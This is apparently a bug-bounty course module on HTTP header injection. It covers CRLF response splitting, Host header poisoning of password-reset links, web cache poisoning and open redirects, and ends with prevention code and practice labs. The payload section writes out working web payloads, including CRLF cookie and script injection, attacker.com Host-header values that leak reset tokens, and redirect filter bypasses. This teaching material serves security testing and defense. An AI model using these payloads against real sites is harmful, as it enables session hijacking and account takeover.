# 📩 Module 08: Header Injection

> **Level:** 🟡 Intermediate | **Time:** ~2 hours | **Prerequisites:** Module 01-07

---

## 📖 Overview

HTTP Header Injection vulnerabilities occur when user-supplied data is included in HTTP response headers without proper sanitization. This can lead to response splitting, cache poisoning, session fixation, redirect attacks, and XSS. These bugs are underrated but consistently found on real targets.

---

## ❓ Why It Matters

Headers control critical browser behavior — redirects, content type, cookie setting, and more. By injecting into headers, attackers can poison caches to serve malicious content to thousands of users, steal sessions, or perform phishing attacks.

---

## 🌍 Real-World Example

A researcher found that a web application reflected the `X-Forwarded-For` header directly into the `Location` redirect header without sanitization. By injecting CRLF sequences, they could set arbitrary cookies on victims via cache poisoning, leading to a **$5,000 high severity bounty**.

---

## 📋 Step-by-Step Methodology

### Types of Header Injection

```
1. HTTP Response Splitting (CRLF Injection)
   - Inject \r\n to add new response headers
   
2. Host Header Injection
   - Manipulate Host header to affect password reset links
   
3. X-Forwarded-For Injection
   - Inject IP-based access controls
   
4. Cache Poisoning via Header Injection
   - Inject headers that get cached and served to others
```

### Testing Methodology

```
1. Identify parameters reflected in response headers
   - Test all URL parameters, form fields
   - Check redirect URLs
   - Test Host, X-Forwarded-For, X-Host headers
   
2. Inject CRLF sequences
   - %0d%0a (URL-encoded \r\n)
   - %0a (just newline)
   - %0d (just carriage return)
   
3. Check for header injection in redirect responses
   - 301/302 responses with Location: header
   - Any header that reflects user input
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercept and inject into headers |
| **curl** | Test headers from command line |
| **Param Miner** | Discover reflected headers |

---

## 💡 Payload Examples

### CRLF Injection

```
# Basic CRLF test
https://target.com/redirect?url=https://safe.com%0d%0aSet-Cookie:session=hijacked

# Expected result (if vulnerable):
HTTP/1.1 302 Found
Location: https://safe.com
Set-Cookie: session=hijacked     ← Injected!

# More advanced - inject XSS via CRLF
https://target.com/redirect?url=%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>

# CRLF in various locations
Parameter: ?redirect=%0d%0aX-Injected:true
Header value injection
Cookie value injection
```

### Host Header Injection

```
# Change Host header in password reset request
POST /forgot-password HTTP/1.1
Host: attacker.com                    ← Changed!
Content-Type: application/x-www-form-urlencoded

email=victim@example.com

# If vulnerable, victim receives:
# "Click here to reset: https://attacker.com/reset?token=abc123"
# Attacker sees the token in their access logs!

# Also test:
Host: legitimate.com:@attacker.com
Host: attacker.com#legitimate.com
Host: legitimate.com.attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
```

### Web Cache Poisoning

```
# If Host header is reflected and response is cached:
GET /page HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: attacker.com

# If response cached includes:
<link href="https://attacker.com/style.css">
# All subsequent visitors get the poisoned page!

# Test with X-Cache headers in response:
X-Cache: HIT      ← Cached
X-Cache: MISS     ← Not cached (but may be cached next request)
```

### Open Redirect via Header Injection

```
# Test redirect parameters
https://target.com/?redirect=https://google.com
https://target.com/?next=/dashboard
https://target.com/?return_url=/profile

# Inject into redirect
https://target.com/?redirect=https://attacker.com
https://target.com/?redirect=//attacker.com
https://target.com/?redirect=%2f%2fattacker.com
https://target.com/?redirect=https:attacker.com

# Bypass common filters
https://target.com/?redirect=https://attacker.com@legitimate.com
https://target.com/?redirect=https://legitimate.com.attacker.com
https://target.com/?redirect=https://legitimate.com#https://attacker.com
```

---

## 🛡️ Prevention

| Issue | Prevention |
|-------|-----------|
| CRLF injection | Strip/encode `\r\n` from all user input before using in headers |
| Host header injection | Use absolute URLs configured on server, not from Host header |
| Open redirect | Whitelist allowed redirect destinations |
| Cache poisoning | Validate and normalize headers used as cache keys |

```python
# Python: Prevent CRLF injection
import re

def sanitize_header_value(value):
    # Remove carriage returns and newlines
    return re.sub(r'[\r\n]', '', value)

# Validate redirect URLs
from urllib.parse import urlparse

def is_safe_redirect(url, allowed_host):
    parsed = urlparse(url)
    return parsed.netloc == '' or parsed.netloc == allowed_host
```

---

## 🧪 Practice Labs

| Lab | Link | Exercise |
|-----|------|---------|
| PortSwigger | [portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning) | Cache poisoning labs |
| PortSwigger | [portswigger.net/web-security/host-header](https://portswigger.net/web-security/host-header) | Host header injection labs |
| Param Miner | Burp Extension | Discover unkeyed headers |

---

<div align="center">

[← Module 07: Cross-Site Scripting](../07.%20Cross%20Site%20Scripting%20(XSS)/README.md) | [Next Module: Client-Side Attacks →](../09.%20Client%20Side%20Attacks/README.md)

</div>
